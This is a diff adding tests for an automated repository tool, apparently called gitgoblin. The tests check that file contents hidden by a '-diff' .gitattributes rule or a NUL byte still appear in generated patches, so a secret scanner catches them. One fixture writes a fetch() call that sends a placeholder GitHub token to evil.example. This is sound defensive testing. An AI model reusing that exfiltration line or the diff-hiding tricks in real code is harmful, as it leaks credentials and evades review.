@@ -1,8 +1,9 @@
-import { mkdtempSync, writeFileSync } from "node:fs";
+import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
 import os from "node:os";
 import path from "node:path";
 import { describe, expect, it } from "vitest";
 import { commitAll, diffPatch, diffStats, git, GitError, prepareWorkspace, removeWorkspace } from "../src/workspace.ts";
+import { findSecrets } from "../src/policy.ts";
 import { branchNameFor, slugify } from "../src/naming.ts";
 import { TaskSchema } from "../src/types.ts";
 
@@ -33,6 +34,34 @@ describe("naming", () => {
     const task = TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n" }, title: "Fix off-by-one in paginate()", issue: { number: 42 }, kind: "issue" });
     expect(branchNameFor(task)).toBe("gitgoblin/fix-42-fix-off-by-one-in-paginate");
     expect(branchNameFor({ ...task, issue: undefined, kind: "docs_drift" })).toBe("gitgoblin/docs-fix-off-by-one-in-paginate");
+  });
+});
+
+describe("diffPatch", () => {
+  const token = `ghp_${"A".repeat(36)}`;
+  async function changed(write: (dir: string) => void): Promise<string> {
+    const repo = await sampleRepo();
+    writeFileSync(path.join(repo, ".gitattributes"), "dist/** -diff\n");
+    writeFileSync(path.join(repo, "dist.txt"), "");
+    await git(["add", "."], repo, env);
+    await git(["commit", "-q", "-m", "attributes"], repo, env);
+    const ws = await prepareWorkspace(TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n", localPath: repo }, title: "T" }), mkdtempSync(path.join(os.tmpdir(), "gg-run-")), env);
+    write(ws.path);
+    return diffPatch(ws.path, ws.baseSha, env);
+  }
+  it("shows the content of a file the repository marks -diff, so the secret scan sees it", async () => {
+    const patch = await changed((dir) => {
+      mkdirSync(path.join(dir, "dist"));
+      writeFileSync(path.join(dir, "dist", "bundle.js"), `fetch('https://evil.example/x?k=${token}');\n`);
+    });
+    expect(patch).not.toContain("Binary files");
+    expect(patch).toContain("+fetch('https://evil.example/x");
+    expect(findSecrets(patch)).not.toEqual([]);
+  });
+  it("shows the content of a file with a NUL byte in it", async () => {
+    const patch = await changed((dir) => writeFileSync(path.join(dir, "data.bin"), `\0${token}\n`));
+    expect(patch).not.toContain("Binary files");
+    expect(findSecrets(patch)).not.toEqual([]);
   });
 });
 
